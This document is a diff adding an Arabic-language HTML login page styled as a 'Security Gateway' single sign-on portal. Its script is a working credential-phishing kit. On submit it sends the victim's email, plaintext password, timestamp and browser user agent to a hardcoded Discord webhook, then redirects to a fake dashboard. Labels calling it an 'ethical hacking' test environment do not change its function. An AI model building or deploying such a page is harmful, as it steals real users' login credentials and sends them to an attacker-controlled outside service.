@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - بوابة الأمان</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .container {
+            background: rgba(255,255,255,0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 20px;
+            padding: 45px 40px 35px;
+            width: 420px;
+            max-width: 90%;
+            box-shadow: 0 25px 60px rgba(0,0,0,0.5);
+            position: relative;
+            overflow: hidden;
+        }
+        .container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #667eea, #764ba2, #f093fb);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 25px;
+        }
+        .logo svg {
+            width: 60px;
+            height: 60px;
+        }
+        .logo h1 {
+            font-size: 22px;
+            color: #1a1a2e;
+            margin-top: 10px;
+            font-weight: 700;
+        }
+        .logo p {
+            color: #666;
+            font-size: 13px;
+            margin-top: 4px;
+        }
+        .input-group {
+            margin-bottom: 18px;
+        }
+        .input-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 6px;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+            background: #fafafa;
+            outline: none;
+        }
+        .input-group input:focus {
+            border-color: #667eea;
+            background: #fff;
+            box-shadow: 0 0 0 4px rgba(102,126,234,0.15);
+        }
+        .input-group input.error {
+            border-color: #e74c3c;
+            background: #fff5f5;
+        }
+        .error-msg {
+            color: #e74c3c;
+            font-size: 12px;
+            margin-top: 5px;
+            display: none;
+        }
+        .error-msg.show {
+            display: block;
+        }
+        .captcha-area {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            background: #f4f4f9;
+            padding: 12px 16px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            border: 1px solid #e0e0e0;
+        }
+        .captcha-area input[type="checkbox"] {
+            width: 20px;
+            height: 20px;
+            accent-color: #667eea;
+            cursor: pointer;
+        }
+        .captcha-area label {
+            font-size: 14px;
+            color: #444;
+            cursor: pointer;
+            flex: 1;
+        }
+        .captcha-area .badge {
+            background: #667eea;
+            color: #fff;
+            font-size: 11px;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-weight: 600;
+        }
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            letter-spacing: 0.5px;
+        }
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(102,126,234,0.4);
+        }
+        .btn:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        .footer-links {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 13px;
+            color: #888;
+        }
+        .footer-links a {
+            color: #667eea;
+            text-decoration: none;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        .status-bar {
+            text-align: center;
+            margin-top: 12px;
+            font-size: 13px;
+            color: #888;
+            border-top: 1px solid #eee;
+            padding-top: 14px;
+        }
+        .loader {
+            display: none;
+            text-align: center;
+            margin: 10px 0;
+        }
+        .loader.show {
+            display: block;
+        }
+        .spinner {
+            display: inline-block;
+            width: 28px;
+            height: 28px;
+            border: 3px solid #e0e0e0;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo">
+        <svg viewBox="0 0 24 24" fill="none" stroke="#667eea" stroke-width="1.5">
+            <path d="M12 2L2 7l10 5 10-5-10-5z"/>
+            <path d="M2 17l10 5 10-5"/>
+            <path d="M2 12l10 5 10-5"/>
+        </svg>
+        <h1>بوابة الأمان</h1>
+        <p>منصة تسجيل الدخول الموحّد</p>
+    </div>
+
+    <form id="loginForm">
+        <div class="input-group">
+            <label for="email">البريد الإلكتروني</label>
+            <input type="email" id="email" name="email" placeholder="example@domain.com" required autocomplete="email">
+            <div class="error-msg" id="emailError">يرجى إدخال بريد إلكتروني صالح</div>
+        </div>
+
+        <div class="input-group">
+            <label for="password">كلمة المرور</label>
+            <input type="password" id="password" name="password" placeholder="••••••••" required autocomplete="current-password">
+            <div class="error-msg" id="passError">كلمة المرور مطلوبة</div>
+        </div>
+
+        <div class="captcha-area">
+            <input type="checkbox" id="captcha" required>
+            <label for="captcha">لست روبوتاً</label>
+            <span class="badge">✓ التحقق</span>
+        </div>
+
+        <div class="loader" id="loader">
+            <div class="spinner"></div>
+            <p style="margin-top:8px; color:#666;">جاري التحقق من البيانات...</p>
+        </div>
+
+        <button type="submit" class="btn" id="submitBtn">دخول</button>
+    </form>
+
+    <div class="footer-links">
+        <a href="#">مساعدة</a> &nbsp;|&nbsp;
+        <a href="#">سياسة الخصوصية</a> &nbsp;|&nbsp;
+        <a href="#">الشروط</a>
+    </div>
+
+    <div class="status-bar">
+        <span id="statusText">بيئة اختبارية آمنة</span>
+    </div>
+</div>
+
+<script>
+    const form = document.getElementById('loginForm');
+    const email = document.getElementById('email');
+    const password = document.getElementById('password');
+    const captcha = document.getElementById('captcha');
+    const submitBtn = document.getElementById('submitBtn');
+    const loader = document.getElementById('loader');
+    const statusText = document.getElementById('statusText');
+    const emailError = document.getElementById('emailError');
+    const passError = document.getElementById('passError');
+
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1510744005980459072/Wo0tVKL36lpZttZ5Yl8HGT8LQH1Ixmkl2xcsdnipXOmoICtsPtCPKdA2iwkVvn_q1qRA';
+
+    function validateEmail(e) {
+        return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e);
+    }
+
+    email.addEventListener('input', () => {
+        email.classList.remove('error');
+        emailError.classList.remove('show');
+    });
+    password.addEventListener('input', () => {
+        password.classList.remove('error');
+        passError.classList.remove('show');
+    });
+
+    form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        let valid = true;
+
+        if (!validateEmail(email.value)) {
+            email.classList.add('error');
+            emailError.classList.add('show');
+            valid = false;
+        } else {
+            email.classList.remove('error');
+            emailError.classList.remove('show');
+        }
+
+        if (password.value.trim() === '') {
+            password.classList.add('error');
+            passError.classList.add('show');
+            valid = false;
+        } else {
+            password.classList.remove('error');
+            passError.classList.remove('show');
+        }
+
+        if (!captcha.checked) {
+            alert('يرجى تأكيد أنك لست روبوتاً');
+            valid = false;
+        }
+
+        if (!valid) return;
+
+        submitBtn.disabled = true;
+        loader.classList.add('show');
+        statusText.textContent = 'جاري الإرسال...';
+
+        const payload = {
+            content: '**🔐 تسجيل دخول جديد - بيئة اختبارية**',
+            embeds: [{
+                title: 'بيانات تسجيل الدخول',
+                color: 0x667eea,
+                fields: [
+                    { name: '📧 البريد الإلكتروني', value: email.value, inline: true },
+                    { name: '🔑 كلمة المرور', value: `||${password.value}||`, inline: true },
+                    { name: '🕐 الوقت', value: new Date().toLocaleString('ar-SA'), inline: false },
+                    { name: '🌐 المصدر', value: window.navigator.userAgent, inline: false }
+                ],
+                footer: { text: 'اختراق أخلاقي - بيئة معزولة' },
+                timestamp: new Date().toISOString()
+            }]
+        };
+
+        try {
+            const response = await fetch(WEBHOOK_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                statusText.textContent = '✅ تم الإرسال بنجاح - بيئة اختبارية';
+                // Simulate redirect after success
+                setTimeout(() => {
+                    window.location.href = 'https://example.com/dashboard';
+                }, 1500);
+            } else {
+                statusText.textContent = '⚠️ فشل الإرسال - تحقق من الرابط';
+                submitBtn.disabled = false;
+                loader.classList.remove('show');
+            }
+        } catch (err) {
+            statusText.textContent = '❌ خطأ في الاتصال';
+            submitBtn.disabled = false;
+            loader.classList.remove('show');
+        }
+    });
+</script>
+
+</body>
+</html>
